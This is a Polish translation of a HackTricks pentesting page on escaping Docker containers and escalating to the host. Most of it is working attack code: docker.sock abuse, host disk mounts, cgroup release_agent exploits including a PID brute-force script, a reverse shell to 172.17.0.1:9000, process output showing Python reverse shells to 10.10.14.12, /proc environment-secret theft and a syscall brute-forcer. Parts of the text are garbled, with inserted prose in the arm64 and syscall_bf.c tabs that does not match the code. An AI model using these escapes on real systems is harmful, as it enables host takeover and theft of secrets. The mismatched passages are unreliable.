# Ucieczka z Docker / Eskalacja uprawnień

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej **zaawansowanych narzędzi społeczności** na świecie.\
Zdobądź dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Automatyczne wyliczanie i ucieczka

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Może również **wyliczać kontenery**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): To narzędzie jest dość **przydatne do wyliczania kontenera, w którym się znajdujesz, a nawet próby automatycznej ucieczki**
* [**amicontained**](https://github.com/genuinetools/amicontained): Przydatne narzędzie do uzyskania uprawnień kontenera w celu znalezienia sposobów ucieczki z niego
* [**deepce**](https://github.com/stealthcopter/deepce): Narzędzie do wyliczania i ucieczki z kontenerów
* [**grype**](https://github.com/anchore/grype): Pobierz CVE zawarte w oprogramowaniu zainstalowanym w obrazie

## Ucieczka z zamontowanego gniazda Docker

Jeśli w jakiś sposób zauważysz, że **gniazdo docker jest zamontowane** wewnątrz kontenera Docker, będziesz mógł z niego uciec.\
Zazwyczaj dzieje się to w kontenerach Docker, które z jakiegoś powodu muszą połączyć się z demonek Docker, aby wykonywać akcje.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
W tym przypadku możesz użyć zwykłych poleceń docker do komunikacji z demonem dockera:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
W przypadku, gdy **gniazdo dockerowe znajduje się w nieoczekiwanym miejscu**, nadal możesz się z nim komunikować, używając polecenia **`docker`** z parametrem **`-H unix:///ścieżka/do/docker.sock`**
{% endhint %}

Docker daemon może również [nasłuchiwać na porcie (domyślnie 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) lub w systemach opartych na Systemd, komunikacja z demonem Dockera może odbywać się za pomocą gniazda Systemd `fd://`.

{% hint style="info" %}
Dodatkowo, zwróć uwagę na gniazda uruchomieniowe innych środowisk uruchomieniowych:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Ucieczka z Nadużycia Uprawnień

Powinieneś sprawdzić uprawnienia kontenera, jeśli ma któreś z następujących, możesz z niego uciec: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Możesz sprawdzić aktualne uprawnienia kontenera za pomocą **wcześniej wspomnianych narzędzi automatycznych** lub:
```bash
capsh --print
```
Na następnej stronie możesz dowiedzieć się więcej o **zdolnościach systemu Linux** i jak je wykorzystać do ucieczki/escalacji uprawnień:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Ucieczka z uprzywilejowanych kontenerów

Uprzywilejowany kontener może być utworzony z flagą `--privileged` lub wyłączeniem konkretnych zabezpieczeń:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

Flaga `--privileged` znacząco obniża bezpieczeństwo kontenera, oferując **nieograniczony dostęp do urządzeń** i omijając **kilka zabezpieczeń**. Aby uzyskać szczegółowy opis, zapoznaj się z dokumentacją dotyczącą pełnych skutków użycia `--privileged`.

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Uprzywilejowany + hostPID

Dzięki tym uprawnieniom możesz **przejść do przestrzeni nazw procesu uruchomionego na hoście jako root**, na przykład init (pid:1), wykonując po prostu: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Wypróbuj to w kontenerze wykonując:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Uprzywilejowany

Tylko z flagą privileged możesz spróbować uzyskać dostęp do dysku hosta lub próbować uciec, wykorzystując release\_agent lub inne ucieczki.

Wykonaj następujące obejścia w kontenerze:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Montowanie dysku - Poc1

Poprawnie skonfigurowane kontenery Docker nie pozwolą na wykonanie komendy **fdisk -l**. Jednakże w przypadku błędnie skonfigurowanej komendy Docker, gdzie flaga `--privileged` lub `--device=/dev/sda1` z uprawnieniami jest określona, istnieje możliwość uzyskania uprawnień do przeglądania dysku hosta.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Aby przejąć kontrolę nad maszyną hosta, jest to trywialne:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
I oto jest! Teraz możesz uzyskać dostęp do systemu plików hosta, ponieważ jest on zamontowany w folderze `/mnt/hola`.

#### Montowanie dysku - Poc2

Wewnątrz kontenera atakujący może próbować uzyskać dalszy dostęp do podstawowego systemu operacyjnego hosta poprzez zapisywalny wolumin hostPath utworzony przez klaster. Poniżej znajdziesz kilka powszechnych rzeczy, które możesz sprawdzić wewnątrz kontenera, aby zobaczyć, czy wykorzystasz ten wektor ataku.
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Ucieczka uprawnień poprzez wykorzystanie istniejącego release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="Początkowy PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### Ucieczka uprawnień poprzez nadużycie utworzonego release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="Drugi PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Znajdź **wyjaśnienie techniki** w:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Ucieczka z uprawnieniami poprzez wykorzystanie release\_agent bez znajomości ścieżki względnej - PoC3

W poprzednich atakach **ujawniona jest bezwzględna ścieżka kontenera w systemie hosta**. Jednakże nie zawsze jest to przypadkiem. W sytuacjach, gdy **nie znasz bezwzględnej ścieżki kontenera w systemie hosta**, możesz skorzystać z tej techniki:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Wykonanie PoC w kontenerze z uprawnieniami powinno dostarczyć wynik podobny do:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Ucieczka przywilejów poprzez nadużycie wrażliwych montowań

Istnieje kilka plików, które mogą być zamontowane i **dają informacje o hostingu podstawowym**. Niektóre z nich mogą nawet wskazywać **coś, co ma być wykonane przez hosta, gdy coś się stanie** (co pozwoli atakującemu uciec z kontenera).\
Nadużycie tych plików może pozwolić na:

* release\_agent (już omówiony wcześniej)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Możesz jednak znaleźć **inne wrażliwe pliki**, które warto sprawdzić na tej stronie:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Dowolne montowania

W kilku przypadkach zauważysz, że **kontener ma pewien wolumin zamontowany z hosta**. Jeśli ten wolumin nie został poprawnie skonfigurowany, możesz **uzyskać dostęp/modyfikować wrażliwe dane**: Odczytywać tajne informacje, zmieniać klucze autoryzacyjne ssh...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Eskalacja uprawnień za pomocą 2 powłok i montowania hosta

Jeśli masz dostęp jako **root wewnątrz kontenera**, który ma pewny folder z hosta zamontowany i udało ci się **uciec jako użytkownik bez uprawnień do hosta** i masz dostęp do odczytu w zamontowanym folderze.\
Możesz utworzyć **plik bash suid** w **zamontowanym folderze** wewnątrz **kontenera** i **wykonać go z hosta** w celu eskalacji uprawnień.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Eskalacja uprawnień za pomocą 2 powłok

Jeśli masz dostęp jako **root wewnątrz kontenera** i udało ci się **wydostać jako użytkownik bez uprawnień do hosta**, możesz wykorzystać obie powłoki do **eskalcji uprawnień wewnątrz hosta**, jeśli masz zdolność MKNOD wewnątrz kontenera (domyślnie jest dostępna) jak [**wyjaśniono w tym poście**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Dzięki tej zdolności użytkownik root wewnątrz kontenera może **tworzyć pliki urządzeń blokowych**. Pliki urządzeń są specjalnymi plikami używanymi do **dostępu do sprzętu i modułów jądra**. Na przykład plik urządzenia blokowego /dev/sda umożliwia **odczytanie surowych danych na dysku systemowym**.

Docker zabezpiecza przed nadużyciem plików urządzeń blokowych w kontenerach, stosując politykę cgroup, która **blokuje operacje odczytu/zapisu na plikach urządzeń blokowych**. Niemniej jednak, jeśli plik urządzenia blokowego jest **utworzony wewnątrz kontenera**, staje się on dostępny z zewnątrz kontenera za pośrednictwem katalogu **/proc/PID/root/**. Ten dostęp wymaga, aby **właścicielem procesu był ten sam** zarówno wewnątrz, jak i na zewnątrz kontenera.

Przykład **wykorzystania** z tego [**opisu**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Jeśli masz dostęp do procesów hosta, będziesz mógł uzyskać dostęp do wielu wrażliwych informacji przechowywanych w tych procesach. Uruchom testowe laboratorium:
```
docker run --rm -it --pid=host ubuntu bash
```
Na przykład, będziesz mógł wyświetlić procesy, używając czegoś w stylu `ps auxn` i szukać w poleceniach poufnych informacji.

Następnie, ponieważ **masz dostęp do każdego procesu hosta w /proc/, możesz po prostu ukraść ich tajne zmienne środowiskowe** wykonując:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Możesz również **uzyskać dostęp do deskryptorów plików innych procesów i odczytać ich otwarte pliki**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Możesz również **zabić procesy i spowodować DoS**.

{% hint style="warning" %}
Jeśli w jakiś sposób masz uprzywilejowany **dostęp do procesu poza kontenerem**, możesz uruchomić coś w rodzaju `nsenter --target <pid> --all` lub `nsenter --target <pid> --mount --net --pid --cgroup` aby **uruchomić powłokę z tymi samymi ograniczeniami ns** (oby żadne) **jak ten proces.**
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Jeśli kontener został skonfigurowany z [sterownikiem sieci hosta Dockera (`--network=host`)](https://docs.docker.com/network/host/), stos sieciowy tego kontenera nie jest izolowany od hosta Dockera (kontener dzieli przestrzeń sieciową hosta) i kontener nie otrzymuje przydzielonego własnego adresu IP. Innymi słowy, **kontener łączy wszystkie usługi bezpośrednio z adresem IP hosta**. Ponadto kontener może **przechwytywać WSZYSTKI ruch sieciowy, który host** wysyła i odbiera na współdzielonym interfejsie `tcpdump -i eth0`.

Na przykład, można użyć tego do **przechwytywania i nawet podszywania się pod ruch** między hostem a instancją metadanych.

Tak jak w poniższych przykładach:

* [Opis: Jak skontaktować się z Google SRE: Wprowadzenie powłoki w chmurze SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Atak MITM na usługę metadanych umożliwia eskalację uprawnień roota (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Będziesz również mógł uzyskać dostęp do **usług sieciowych powiązanych z localhostem** wewnątrz hosta lub nawet uzyskać dostęp do **uprawnień metadanych węzła** (które mogą być inne niż te, do których może uzyskać dostęp kontener). 

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Z `hostIPC=true` uzyskujesz dostęp do zasobów komunikacji międzyprocesowej (IPC) hosta, takich jak **pamięć współdzielona** w `/dev/shm`. Pozwala to na odczyt/zapis tam, gdzie te same zasoby IPC są używane przez inne procesy hosta lub moduły. Użyj `ipcs`, aby dokładniej zbadać te mechanizmy IPC.

* **Sprawdź /dev/shm** - Sprawdź, czy w tym miejscu pamięci współdzielonej znajdują się jakiekolwiek pliki: `ls -la /dev/shm`
* **Sprawdź istniejące obiekty IPC** - Możesz sprawdzić, czy jakiekolwiek obiekty IPC są używane za pomocą `/usr/bin/ipcs`. Sprawdź to poleceniem: `ipcs -a`

### Przywróć uprawnienia

Jeśli wywołanie systemowe **`unshare`** nie jest zabronione, możesz odzyskać wszystkie uprawnienia, uruchamiając:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Nadużycie przestrzeni nazw użytkownika za pomocą symlinków

Druga technika wyjaśniona w poście [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) wskazuje, jak można nadużyć powiązanych montaży z przestrzeniami nazw użytkownika, aby wpłynąć na pliki wewnątrz hosta (w tym konkretnym przypadku, usunąć pliki).

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** z wykorzystaniem najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVE

### Wykorzystanie Runc (CVE-2019-5736)

W przypadku, gdy możesz wykonać `docker exec` jako root (prawdopodobnie za pomocą sudo), możesz próbować eskalować uprawnienia, uciekając z kontenera, nadużywając CVE-2019-5736 (wykorzystaj [tutaj](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Ta technika polega głównie na **nadpisaniu** binarnego pliku _**/bin/sh**_ hosta **z kontenera**, dzięki czemu każdy wykonujący docker exec może uruchomić ładunek.

Zmień ładunek odpowiednio i skompiluj main.go za pomocą `go build main.go`. Wynikowy plik binarny powinien być umieszczony w kontenerze docker do wykonania.\
Po wykonaniu, gdy wyświetli `[+] Overwritten /bin/sh successfully`, musisz wykonać następujące polecenie z maszyny hosta:

`docker exec -it <nazwa-kontenera> /bin/sh`

Spowoduje to uruchomienie ładunku obecnego w pliku main.go.

Więcej informacji: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Kontener może być podatny na inne CVE, można znaleźć listę pod [tutaj](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Własna ucieczka z Docker

### Powierzchnia ucieczki Docker

* **Przestrzenie nazw:** Proces powinien być **całkowicie oddzielony od innych procesów** za pomocą przestrzeni nazw, więc nie możemy uciec interakcji z innymi procesami ze względu na przestrzenie nazw (domyślnie nie można komunikować się za pomocą IPC, gniazd unixowych, usług sieciowych, D-Bus, `/proc` innych procesów).
* **Użytkownik root**: Domyślnie użytkownik uruchamiający proces to użytkownik root (jednak jego uprawnienia są ograniczone).
* **Uprawnienia**: Docker pozostawia następujące uprawnienia: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscalle:** To są syscalle, których **użytkownik root nie będzie mógł wywołać** (ze względu na brakujące uprawnienia + Seccomp). Inne syscalle mogą być użyte do próby ucieczki.

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 syscalls" %}### Eskalacja uprawnień w Dockerze - Przywłaszczenie uprawnień

W przypadku, gdy atakujący uzyska dostęp do kontenera Dockera, może próbować eskalacji uprawnień, aby uzyskać większe uprawnienia w systemie hosta. Istnieje wiele technik eskalacji uprawnień w kontenerach Dockera, w tym wykorzystanie błędów w jądrze systemu operacyjnego hosta.

Jedną z popularnych technik eskalacji uprawnień w kontenerach Dockera jest próba wykorzystania błędów w jądrze systemu operacyjnego hosta, aby uzyskać dostęp do pełnych uprawnień na hoście. Atakujący może próbować wykonać tzw. "przywłaszczenie uprawnień", czyli uzyskanie dostępu do uprawnień root na hoście poprzez wykorzystanie błędów w jądrze systemu operacyjnego.

Jest to poważne zagrożenie dla bezpieczeństwa, dlatego ważne jest, aby regularnie aktualizować jądro systemu operacyjnego hosta oraz stosować inne środki bezpieczeństwa, takie jak ograniczanie uprawnień kontenerów Dockera i monitorowanie ich aktywności.
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}Wprowadzenie
-----------

Ten program demonstruje wykorzystanie ataku typu "syscall brute force" w celu uzyskania dostępu do przestrzeni jądra systemu Linux z kontenera Docker. Atak ten polega na próbie wywołania wszystkich dostępnych wywołań systemowych w celu uzyskania dostępu do jądra systemu.

### Użycie

Aby skompilować program, użyj polecenia:

```bash
gcc -o syscall_bf syscall_bf.c
```

Następnie uruchom program, podając numer PID kontenera Docker jako argument:

```bash
./syscall_bf <PID_kontenera_Docker>
```

### Wynik

Po uruchomieniu programu, jeśli atak się powiedzie, zostanie uzyskany dostęp do przestrzeni jądra systemu Linux z kontenera Docker.

### Uwaga

Ten program ma charakter wyłącznie edukacyjny. Należy używać go wyłącznie w legalnych celach i na własnych systemach lub systemach, do których masz zezwolenie na testowanie. Autor nie ponosi odpowiedzialności za nielegalne użycie tego programu.{% endtab %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
